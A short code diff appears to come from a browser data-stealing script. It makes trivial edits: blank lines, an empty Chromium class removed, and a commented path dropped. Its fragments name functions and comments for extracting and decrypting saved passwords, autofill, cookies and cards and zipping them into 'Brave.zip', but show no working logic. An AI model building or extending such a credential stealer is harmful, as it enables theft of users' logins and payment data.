@@ -77,6 +77,7 @@ class Utils:
 u = Utils()
 
 
+
 def fetch_key(key_dir):
     try:
         #try:
@@ -108,9 +109,6 @@ def decrypt_string(string, key):
             return "String could not be decrypted or none were found!"
 
 
-class Chromium:
-    def __init__(self) -> None:
-        pass
 ##
 ##Extract passwords
 ##
@@ -375,7 +373,7 @@ def fetch_autofill(dir, filename="autofill.txt"):
 
 #zip("Brave.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
 
-#  os.path.join(os.environ["USERPROFILE"], )
+
 
 
 def chrome():
